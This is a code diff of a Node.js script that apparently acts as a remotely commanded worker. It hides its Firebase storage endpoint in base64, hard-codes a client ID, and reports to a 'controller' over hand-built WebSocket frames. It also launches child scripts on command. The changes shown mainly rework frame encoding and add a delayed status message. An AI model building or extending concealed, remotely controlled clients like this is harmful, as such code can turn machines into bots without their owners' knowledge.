@@ -11,7 +11,7 @@ let FINISH = new Date().getTime()+21000000
 
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
 
-// USER = 'xxxxxxxxxx12345'
+USER = 'epsylkwvqf09956'
 
 startServer()
 
@@ -132,30 +132,44 @@ async function runWebSocket(url) {
 
 function sendWSMessage(socket, message) {
     try {
-        if (!socket || socket.destroyed) {
-            return false
+        if (!socket || socket.destroyed) return false
+
+        let payload = Buffer.from(message)
+        let length = payload.length
+        let header = []
+        
+        header.push(0x81)
+
+        if (length <= 125) {
+            header.push(0x80 | length)
+        } else if (length <= 65535) {
+            header.push(0x80 | 126)
+            header.push((length >> 8) & 0xff)
+            header.push(length & 0xff)
+        } else {
+            header.push(0x80 | 127)
+            for (let i = 7; i >= 0; i--) {
+                header.push((length >> (8 * i)) & 0xff)
+            }
         }
 
-        let payload = Buffer.from(message, 'utf8')
-        let frame = Buffer.alloc(2 + 4 + payload.length)
-        frame[0] = 0x81
-        frame[1] = 0x80 | payload.length
+        let mask = Buffer.alloc(4)
+        for (let i = 0; i < 4; i++) mask[i] = Math.floor(Math.random() * 256)
 
-        let mask = []
-        for (let i = 0; i < 4; i++) mask.push(Math.floor(Math.random() * 256))
-        for (let i = 0; i < 4; i++) frame[2 + i] = mask[i]
-
-        for (let i = 0; i < payload.length; i++) {
-            frame[6 + i] = payload[i] ^ mask[i % 4]
+        let maskedPayload = Buffer.alloc(length)
+        for (let i = 0; i < length; i++) {
+            maskedPayload[i] = payload[i] ^ mask[i % 4]
         }
+
+        let frame = Buffer.concat([Buffer.from(header), mask, maskedPayload])
 
         socket.write(frame)
-        
         return true
-    } catch (error) {
+    } catch (e) {
         return false
     }
 }
+
 
 function sendPing(socket) {
     try {
@@ -204,7 +218,7 @@ async function checkStatus(firstTime) {
         console.log('---COMPLETED---')
         process.exit(0)
     } else {
-        if (! firstTime) sendWSMessage(CONNECTION, JSON.stringify({ t: 3, s: 'controller', d: { s:1, t: Date.now(), i:USER } }))
+        if (!firstTime) sendWSMessage(CONNECTION, JSON.stringify({ t: 3, s: 'controller', d: { s:1, t: Date.now(), i:USER } }))
 
         try {
             await postAxios(STORAGE+encodeURIComponent('realtime/'+USER+'.json'), '', {
@@ -266,10 +280,18 @@ async function runDynamicServer(data) {
         })
 
         mScript.on('exit', () => {
+            console.log('mScript exit')
+            
             try {
                 mScript.disconnect()
             } catch {}
         })
+
+        setTimeout(() => {
+            let data = {"t":5,"s":"controller_status","c":"epsylkwvqf09956_cmd","d":{"c":1,"u":"db59b380606615b33b0139cb9398e390","s":"epsylkwvqf09956"}}
+
+            sendWSMessage(CONNECTION, JSON.stringify(data))
+        }, 3000)
     } catch (error) {
         console.log('Node: ---SCRIPT-RUNNING-ERROR---')
     }
@@ -315,11 +337,6 @@ async function patchFetch(url, data, headers = {}) {
     } catch (err) {
         throw null
     }
-}
-
-function getQueryParam(url, param) {
-    let match = url.match(new RegExp(`[?&]${param}=([^&]+)`))
-    return match ? match[1] : null
 }
 
 
